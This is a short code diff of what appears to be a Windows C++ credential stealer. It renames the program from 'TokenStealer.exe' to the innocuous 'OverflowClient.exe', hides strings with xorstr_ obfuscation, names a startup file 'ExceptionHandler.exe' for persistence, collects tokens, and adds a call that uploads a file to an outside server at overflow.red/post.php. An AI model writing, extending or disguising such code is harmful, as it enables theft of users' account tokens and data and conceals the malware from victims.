@@ -9,15 +9,14 @@
 #include "helper.h"
 #include "xor.hpp"
 #include "requests.h"
-#include <gdiplus.h>
 
 #pragma comment(lib, "wininet.lib")
-#pragma comment(lib, "user32.lib")
 
 namespace fs = std::filesystem;
 const bool TEST_SERVER = true;
+
 const std::string STARTUP_FILE_NAME = xorstr_("ExceptionHandler.exe");
-const std::string PROGRAM_NAME = xorstr_("TokenStealer.exe");
+const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");
 
 std::vector<std::string> get_tokens() {
 	std::vector<std::string> tokens = {};
@@ -108,7 +107,7 @@ int main() {
 	//	////* Post Tokens */
 	//	//post_request(xorstr_("https://overflow.red/post.php"), payload);
 	//}
-	post_request(xorstr_("https://overflow.red/post.php"), "cmd=send_message&content=test");
-
+	//post_request(xorstr_("https://overflow.red/post.php"), "cmd=send_message&content=test");
+	post_request_file(xorstr_("https://overflow.red/post.php"), "nahnah.jpg");
 	std::cin.get();
 }
